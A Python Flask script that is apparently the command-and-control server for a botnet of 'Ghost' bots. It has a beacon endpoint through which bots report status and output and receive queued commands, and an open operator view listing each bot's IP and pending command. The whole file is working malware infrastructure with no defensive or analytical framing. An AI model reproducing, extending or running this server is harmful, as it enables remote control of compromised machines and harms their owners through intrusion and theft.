from flask import Flask, request, jsonify
import sqlite3
from datetime import datetime

app = Flask(__name__)

# --- Database Setup ---
def init_db():
    conn = sqlite3.connect('ghost_network.db')
    c = conn.cursor()
    # Create table for our "Ghost" bots
    c.execute('''
        CREATE TABLE IF NOT EXISTS bots (
            id TEXT PRIMARY KEY,
            last_seen TEXT,
            ip TEXT,
            status TEXT,
            pending_cmd TEXT
        )
    ''')
    conn.commit()
    conn.close()

# --- Endpoint: Bot Beacon ---
@app.route('/beacon/<bot_id>', methods=['POST'])
def bot_beacon(bot_id):
    """
    Bot polling endpoint.
    Bot posts (with JSON) its status; server returns any pending command.
    """
    bot_ip = request.remote_addr
    data = request.json  # Optional: contains sysinfo or command output

    conn = sqlite3.connect('ghost_network.db')
    c = conn.cursor()

    # Update bot status and maintain pending_cmd if present
    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    c.execute(
        "INSERT OR REPLACE INTO bots (id, last_seen, ip, status, pending_cmd) "
        "VALUES (?, ?, ?, ?, (SELECT pending_cmd FROM bots WHERE id=?))",
        (bot_id, now, bot_ip, "Online", bot_id)
    )

    # Check for pending command
    c.execute("SELECT pending_cmd FROM bots WHERE id=?", (bot_id,))
    row = c.fetchone()
    command = row[0] if row and row[0] else None

    # Clear command after sending
    if command:
        c.execute("UPDATE bots SET pending_cmd = NULL WHERE id=?", (bot_id,))
    conn.commit()
    conn.close()

    return jsonify({"command": command if command else "sleep"})

# --- Endpoint: Operator Dashboard ---
@app.route('/operator/view', methods=['GET'])
def view_bots():
    """Returns all bots status for operator."""
    conn = sqlite3.connect('ghost_network.db')
    c = conn.cursor()
    c.execute("SELECT * FROM bots")
    all_bots = c.fetchall()
    conn.close()
    # Optional: Return JSON list instead of raw tuples
    bots_data = [
        {"id": row[0], "last_seen": row[1], "ip": row[2], "status": row[3], "pending_cmd": row[4]}
        for row in all_bots
    ]
    return jsonify({"bots": bots_data})

if __name__ == "__main__":
    init_db()
    # In production, use SSL/HTTPS
    app.run(port=80, host='0.0.0.0')